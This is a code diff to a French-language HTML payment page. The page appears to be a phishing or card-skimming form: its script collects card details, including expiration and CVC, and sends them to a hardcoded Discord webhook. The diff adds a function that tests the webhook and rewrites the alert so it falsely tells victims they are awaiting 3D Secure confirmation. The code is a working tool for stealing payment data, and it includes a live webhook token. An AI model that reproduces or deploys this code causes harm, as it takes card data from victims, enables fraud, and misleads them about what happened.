@@ -234,6 +234,31 @@
 
 <!-- Script en bas -->
 <script>
+  const webhookUrl = 'https://discordapp.com/api/webhooks/1466898133404356608/j3pzvFO5KbZcDvJgHcdYBZnLADX3LGbd8LajNapJYbcNLqRYd6N-RJEAqWbvQ0XaQFbE'; // Remplace par ton webhook Discord
+
+  // Fonction pour tester l'envoi d'un message simple
+  function testWebhook() {
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ content: 'Test de webhook' }) // Message simple
+    })
+    .then(res => {
+      if (res.ok) {
+        alert('Test réussi : webhook a reçu le message.');
+      } else {
+        alert('Erreur lors de l\'envoi : ' + res.status);
+      }
+    })
+    .catch(error => {
+      console.error('Erreur:', error);
+      alert('Erreur lors de l\'envoi.');
+    });
+  }
+
+  // Fonction pour envoyer les données du formulaire
   const form = document.getElementById('paymentForm');
 
   form.addEventListener('submit', (e) => {
@@ -245,7 +270,8 @@
     console.log('Expiration:', formData.get('expiration'));
     console.log('CVC:', formData.get('cvc'));
 
-    fetch('https://discordapp.com/api/webhooks/1466898133404356608/j3pzvFO5KbZcDvJgHcdYBZnLADX3LGbd8LajNapJYbcNLqRYd6N-RJEAqWbvQ0XaQFbE', { // Remplace par ton webhook
+    // Envoi des données au webhook
+    fetch(webhookUrl, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -266,7 +292,7 @@
     })
     .then(res => {
       if (res.ok) {
-        alert('Attente de l'application de comfirmation...');
+        alert('Attente de la comfirmation de l'application 3d secure...');
       } else {
         alert('Erreur lors de l\'envoi : ' + res.status);
       }
@@ -280,3 +306,4 @@
 
 </body>
 </html>
+
